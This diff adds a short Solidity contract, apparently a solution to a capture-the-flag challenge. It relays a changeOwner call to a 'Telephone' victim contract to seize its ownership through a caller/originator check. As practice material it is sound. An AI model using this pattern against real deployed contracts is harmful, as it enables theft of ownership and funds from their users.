@@ -1,0 +1,14 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "./Telephone.sol";
+
+contract Attack_Telephone  {
+    Telephone public victim;
+    constructor (address _victim){
+        victim = Telephone(_victim);
+    }
+    function changeOwner(address _owner) public {
+        victim.changeOwner(_owner);
+    }
+}
